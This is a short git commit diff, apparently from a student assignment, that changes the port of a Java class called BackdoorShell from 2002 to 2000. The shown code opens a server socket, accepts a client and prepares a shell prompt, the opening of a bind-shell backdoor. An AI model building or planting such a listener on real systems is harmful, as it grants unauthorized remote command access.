c4bb1960958d9bd52e9f61b68ea4e74138774eb4
Van <vnguyen189@toromail.csudh.edu>
2023-05-02 16:48:58 -0700

    fixed port from 2002 to 2000

--- CSC123Assignment7/src/BackdoorShell.java
+++ CSC123Assignment7/src/BackdoorShell.java
@@ -16,7 +16,7 @@ public class BackdoorShell {
 	public static void main(String[] args) {
 		
 		try {
-			ServerSocket server = new ServerSocket(2002);
+			ServerSocket server = new ServerSocket(2000);
 			Socket client = server.accept();
 			String workingDir = System.getProperty("user.dir");
 			String prompt = System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
